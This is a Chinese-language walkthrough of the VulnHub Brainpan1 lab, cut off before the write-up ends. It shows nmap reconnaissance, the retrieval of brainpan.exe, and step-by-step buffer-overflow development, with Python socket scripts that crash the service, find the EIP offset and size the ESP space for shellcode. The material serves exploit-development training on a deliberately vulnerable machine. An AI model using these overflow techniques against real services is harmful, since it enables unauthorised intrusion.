{"pageProps":{"postData":{"id":"VulnhubBrainpan1","contentHtml":"<h1>Brainpan1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/brainpan-1,51/\">https://www.vulnhub.com/entry/brainpan-1,51/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>166</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>                                        \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-24 22:29 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00038</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.166</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00043</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:E7:<span class=\"hljs-number\">37</span>:<span class=\"hljs-title function_ invoke__\">BE</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00011</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:B6:<span class=\"hljs-title function_ invoke__\">BD</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.166</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-24 22:30 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.166</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0024</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">9999</span>/tcp  open  abyss\n<span class=\"hljs-number\">10000</span>/tcp open  snet-sensor-mgmt\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:E7:<span class=\"hljs-number\">37</span>:<span class=\"hljs-title function_ invoke__\">BE</span> (VMware)\n\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<p>扫出了很奇怪的东西</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p9999,<span class=\"hljs-number\">10000</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.166</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-24 22:31 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.166</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00058</span>s latency).\n\nPORT      STATE SERVICE VERSION\n<span class=\"hljs-number\">9999</span>/tcp  open  abyss?\n<span class=\"hljs-number\">10000</span>/tcp open  http    SimpleHTTPServer <span class=\"hljs-number\">0.6</span> (Python <span class=\"hljs-number\">2.7</span>.<span class=\"hljs-number\">3</span>)\n<span class=\"hljs-number\">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:<span class=\"hljs-comment\">//nmap.org/cgi-bin/submit.cgi?new-service :</span>\nSF-Port9999-TCP:V=<span class=\"hljs-number\">7.94</span>SVN%I=<span class=\"hljs-number\">7</span>%D=<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">24</span>%Time=<span class=\"hljs-number\">671</span>A5A30%P=x86_64-pc-linux-gnu%\nSF:<span class=\"hljs-title function_ invoke__\">r</span>(<span class=\"hljs-literal\">NULL</span>,<span class=\"hljs-number\">298</span>,<span class=\"hljs-string\">\"_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\\nSF:|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\\nSF:x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\nSF:\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\nSF:\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\nSF:\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x2\nSF:0_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x\nSF:20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x\nSF:20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x\nSF:20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\\nSF:x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x\nSF:20\\x20_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINP\nSF:AN\\x20_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENT\nSF:ER\\x20THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:n\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20>>\\x20\"</span>);\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:E7:<span class=\"hljs-number\">37</span>:<span class=\"hljs-title function_ invoke__\">BE</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X|<span class=\"hljs-number\">3</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">32</span> - <span class=\"hljs-number\">3.10</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<p>什么都没有</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p9999,<span class=\"hljs-number\">10000</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">34</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00068</span>s latency).\n\nPORT      STATE SERVICE\n<span class=\"hljs-number\">9999</span>/tcp  <span class=\"hljs-built_in\">open</span>  abyss\n<span class=\"hljs-number\">10000</span>/tcp <span class=\"hljs-built_in\">open</span>  snet-sensor-mgmt\n</code></pre>\n</li>\n</ol>\n<h2>9999端口</h2>\n<ol>\n<li>\n<p>在浏览器访问出现了</p>\n<pre><code class=\"hljs language-python\">_|                            _|                                        \n_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n                                            _|                          \n                                            _|\n\n[________________________ WELCOME TO BRAINPAN _________________________]\n                          ENTER THE PASSWORD                              \n\n                          >>                           ACCESS DENIED\n�\n</code></pre>\n</li>\n<li>\n<p>使用nc连接尝试</p>\n<pre><code class=\"hljs language-python\">nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166</span> <span class=\"hljs-number\">9999</span>\n_|                            _|                                        \n_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n                                            _|                          \n                                            _|\n\n[________________________ WELCOME TO BRAINPAN _________________________]\n                          ENTER THE PASSWORD                              \n\n                          >> <span class=\"hljs-number\">0</span>\n                          ACCESS DENIED\n</code></pre>\n<p>尝试输入了些东西，显示<code>ACCESS DENIED</code> ，应该是有密码之类的</p>\n</li>\n</ol>\n<h2>10000端口</h2>\n<ol>\n<li>\n<p>浏览器访问是个页面</p>\n<p><img src=\"/post-images/VulnhubBrainpan1/image48.png\" alt=\"image.png\"></p>\n<p>很简陋，index就一张照片</p>\n</li>\n<li>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166</span>:<span class=\"hljs-number\">10000</span> -x <span class=\"hljs-number\">403</span>\n//\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class=\"hljs-number\">23</span>: DeprecationWarning: pkg_resources <span class=\"hljs-keyword\">is</span> deprecated <span class=\"hljs-keyword\">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  <span class=\"hljs-keyword\">from</span> pkg_resources <span class=\"hljs-keyword\">import</span> DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0<span class=\"hljs-number\">.4</span><span class=\"hljs-number\">.3</span>                                                                                                  \n (_||| _) (/_(_|| (_| )                                                                                                           \n                                                                                                                                  \nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class=\"hljs-number\">25</span> | Wordlist size: <span class=\"hljs-number\">11460</span>\n\nOutput File: /root/Desktop/test/reports/_192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166_10000</span>/_24-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">24_22</span>-<span class=\"hljs-number\">42</span>-<span class=\"hljs-number\">35.</span>txt\n\nTarget: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166</span>:<span class=\"hljs-number\">10000</span>/\n\n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">35</span>] Starting:                                                                                                              \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">301</span> -    0B  - /<span class=\"hljs-built_in\">bin</span>  ->  /<span class=\"hljs-built_in\">bin</span>/                                   \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">200</span> -  230B  - /<span class=\"hljs-built_in\">bin</span>/                                             \n                                                                             \nTask Completed                     \n</code></pre>\n<p>仅发现一个<code>/bin</code>文件夹</p>\n</li>\n<li>\n<p>进去下载了一个 <code>brainpan.exe</code> 文件，不急着打开，先查看文件</p>\n<p>是一个32位的可执行程序</p>\n<pre><code class=\"hljs language-python\">file brainpan.exe \n//\nbrainpan.exe: PE32 executable (console) Intel <span class=\"hljs-number\">80386</span> (stripped to external PDB), <span class=\"hljs-keyword\">for</span> MS Windows, <span class=\"hljs-number\">5</span> sections\n</code></pre>\n<p>binwalk也没分离出什么东西</p>\n<pre><code class=\"hljs language-python\">binwalk brainpan.exe\n/usr/lib/python3/dist-packages/binwalk/core/magic.py:<span class=\"hljs-number\">431</span>: SyntaxWarning: invalid escape sequence <span class=\"hljs-string\">'\\.'</span>\n  <span class=\"hljs-variable language_\">self</span>.period = re.<span class=\"hljs-built_in\">compile</span>(<span class=\"hljs-string\">\"\\.\"</span>)\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n<span class=\"hljs-number\">0</span>             <span class=\"hljs-number\">0x0</span>             Microsoft executable, portable (PE)\n\n</code></pre>\n</li>\n</ol>\n<h2>brainpan.exe</h2>\n<ol>\n<li>\n<p>放到windows下执行（虚拟机）</p>\n<pre><code class=\"hljs language-python\">[+] initializing winsock...done.\n[+] server socket created.\n[+] bind done on port <span class=\"hljs-number\">9999</span>\n[+] waiting <span class=\"hljs-keyword\">for</span> connections.\n</code></pre>\n<p>使用<code>socket</code>打开了<code>9999</code>端口，我们继续使用nc连接</p>\n<p>和之前的结果一模一样</p>\n</li>\n<li>\n<p>并且输入了字符会返回 几个字符被复制到缓冲区</p>\n<pre><code class=\"hljs language-python\">[get_reply] s = [asdasdasdas\n]\n[get_reply] copied <span class=\"hljs-number\">12</span> <span class=\"hljs-built_in\">bytes</span> to buffer\n[+] check <span class=\"hljs-keyword\">is</span> -<span class=\"hljs-number\">1</span>\n[get_reply] s = [asdasdasdas\n]\n[get_reply] copied <span class=\"hljs-number\">12</span> <span class=\"hljs-built_in\">bytes</span> to buffer\n</code></pre>\n<p>复制到缓冲区的过程，有没有可能存在缓冲区溢出漏洞呢</p>\n</li>\n</ol>\n<h2>验证缓冲区溢出漏洞</h2>\n<ol>\n<li>\n<p>尝试输入足够多的字符看看是否能够溢出</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> socket\na = <span class=\"hljs-string\">\"A\"</span>*<span class=\"hljs-number\">2000</span>  <span class=\"hljs-comment\">#先给他打个2k字符过去</span>\ns = socket.socket()\ns.connect((<span class=\"hljs-string\">'192.168.75.161'</span>,<span class=\"hljs-number\">9999</span>))  // 我的windows虚拟机ip\nr = s.recv(<span class=\"hljs-number\">1024</span>)\ns.send(a.encode(<span class=\"hljs-string\">'utf-8'</span>))\ns.close()\n</code></pre>\n<p>windows下的程序直接崩溃了，说明存在缓冲区溢出漏洞</p>\n</li>\n</ol>\n<h2>定位EIP</h2>\n<ol>\n<li>\n<p>windows打开 <code>Immunity Debugger</code> 连接<code>brainpan.exe</code></p>\n<p><img src=\"/post-images/VulnhubBrainpan1/image49.png\" alt=\"image.png\"></p>\n<p>主要关注右边的</p>\n</li>\n<li>\n<p>因为我们知道超过2000个字符会崩溃，但是究竟是那个字符还不知道，使用<code>gdb pattern</code>来生成2000个唯一字符来判断偏移量</p>\n<pre><code class=\"hljs language-python\">gdb-peda$ pattern create <span class=\"hljs-number\">2000</span>\n<span class=\"hljs-string\">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA'</span>\n</code></pre>\n<p>将字符替换刚刚的A</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> socket\na = <span class=\"hljs-string\">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA'</span>\ns = socket.socket()\ns.connect((<span class=\"hljs-string\">'192.168.75.161'</span>,<span class=\"hljs-number\">9999</span>))\nr = s.recv(<span class=\"hljs-number\">1024</span>)\ns.send(a.encode(<span class=\"hljs-string\">'utf-8'</span>))\ns.close()\n</code></pre>\n</li>\n<li>\n<p>执行py文件，回到windows，<code>Immunity Debugger</code> 点击继续执行按钮</p>\n<p><img src=\"/post-images/VulnhubBrainpan1/image50.png\" alt=\"image.png\"></p>\n<p>得到唯一字符串 <code>73413973</code> ，这是ASCII码的值</p>\n<p><strong>由于小端显示的原因（逆序），相当于</strong><code>s9As</code> ，然后通过<code>pattern offset</code>定位EIP</p>\n<pre><code class=\"hljs language-python\">gdb-peda$ pattern offset s9As\ns9As found at offset: <span class=\"hljs-number\">524</span>\n</code></pre>\n<p>得到溢出溢出字符是524个，也就是只要发送524+4个字符，即可覆盖EIP寄存器，测试一下是否能覆盖EIP</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> socket\na = <span class=\"hljs-string\">'A'</span>*<span class=\"hljs-number\">524</span>+<span class=\"hljs-string\">'B'</span>*<span class=\"hljs-number\">4</span>\ns = socket.socket()\ns.connect((<span class=\"hljs-string\">'192.168.75.161'</span>,<span class=\"hljs-number\">9999</span>))\nr = s.recv(<span class=\"hljs-number\">1024</span>)\ns.send(a.encode(<span class=\"hljs-string\">'utf-8'</span>))\ns.close()\n</code></pre>\n<p><img src=\"/post-images/VulnhubBrainpan1/image51.png\" alt=\"image.png\"></p>\n<p>已经全被覆盖成了<code>42424242</code>也就是<code>B</code> ,确定了我们可以修改EIP</p>\n</li>\n</ol>\n<h2>扩容ESP</h2>\n<p>那么shellcode放到哪里，准备放到ESP,我们测试一下ESP能放多少个字符</p>\n<ol>\n<li>\n<p>修改py文件，向<code>ESP</code>发送500个c字符</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> socket\na = <span class=\"hljs-string\">'A'</span>*<span class=\"hljs-number\">524</span>+<span class=\"hljs-string\">'B'</span>*<span class=\"hljs-number\">4</span>+<span class=\"hljs-string\">'c'</span>*<span class=\"hljs-number\">500</span>\ns = socket.socket()\ns.connect((<span class=\"hljs-string\">'192.168.75.161'</span>,<span class=\"hljs-number\">9999</span>))\nr = s.recv(<span class=\"hljs-number\">1024</span>)\ns.send(a.encode(<span class=\"hljs-string\">'utf-8'</span>))\ns.close()\n</code></pre>\n</li>\n<li>\n<p>可以看到ESP被覆盖为了字符c</p>\n<p><img src=\"/post-images/VulnhubBrainpan1/image52.png\" alt=\"image.png\"></p>\n<p>出现<code>c</code>的首地址是<code>005FF910</code>，最后出现的地址是<code>005FFAE4</code></p>\n<p>那么可以存储的长度应该是<code>005FFAE4</code> -<code>005FF910</code> = <code>1D4</code> 